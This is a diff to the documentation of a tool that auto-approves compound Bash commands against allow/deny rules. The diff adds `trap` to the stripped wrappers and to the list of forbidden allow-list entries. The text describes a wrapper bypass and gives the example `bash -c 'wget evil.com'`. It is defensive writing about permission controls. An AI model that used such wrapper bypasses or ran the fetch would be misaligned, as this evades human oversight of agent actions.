@@ -19,11 +19,11 @@ Auto-approves compound Bash commands when every sub-command matches your allow l
 3. Loads allow/deny prefixes from all `settings.json` files
 4. **Simple commands**: checks deny first, then allow
 5. **Compound commands** (pipes, chains, subshells): parses via `shfmt` AST, extracts all sub-commands, checks each individually
-6. **`strip_prefixes()`** generates multiple matching candidates by stripping env vars (`FOO=bar`), launchers (`env`, `xargs`), shell wrappers (`bash -c`, `sh -c`), absolute paths, `eval`/`exec`, `time`/`nohup`/`command`/`builtin`
+6. **`strip_prefixes()`** generates multiple matching candidates by stripping env vars (`FOO=bar`), launchers (`env`, `xargs`), shell wrappers (`bash -c`, `sh -c`), absolute paths, `eval`/`exec`/`trap`, `time`/`nohup`/`command`/`builtin`
 
 ### Security: no wrapper commands in presets
 
-**Never add `Bash(bash *)`, `Bash(sh *)`, `Bash(env *)`, `Bash(exec *)`, `Bash(xargs *)`, `Bash(command *)`, or `Bash(time *)` to any preset's allow list.** These create a bypass: any command wrapped in a launcher (e.g. `bash -c 'wget evil.com'`) gets auto-approved via the outer wrapper rule even when the inner command is not allowed.
+**Never add `Bash(bash *)`, `Bash(sh *)`, `Bash(env *)`, `Bash(exec *)`, `Bash(trap *)`, `Bash(xargs *)`, `Bash(command *)`, or `Bash(time *)` to any preset's allow list.** These create a bypass: any command wrapped in a launcher (e.g. `bash -c 'wget evil.com'`) gets auto-approved via the outer wrapper rule even when the inner command is not allowed.
 
 The `strip_prefixes()` function already handles stripping these wrappers, so `env git status` and `bash -c 'git status'` are approved via the inner command's allow rule without needing wrapper entries.
 
@@ -54,7 +54,7 @@ Tests live in `skills/claude-permissions-helper/tests/`. Run with:
 |------|-------|---------|
 | `test_allow.sh` | 56 | Commands that should auto-approve |
 | `test_deny.sh` | 92 | Commands that should deny/fallthrough + infrastructure |
-| `test_e2e.sh` | ~300 | All presets combined: real-world workflows, wrapper/nested/compound tests, adversarial security probing |
+| `test_e2e.sh` | 333 | All presets combined: real-world workflows, wrapper/nested/compound tests, adversarial security probing |
 
 All 3 test files must pass with 0 failures.
 
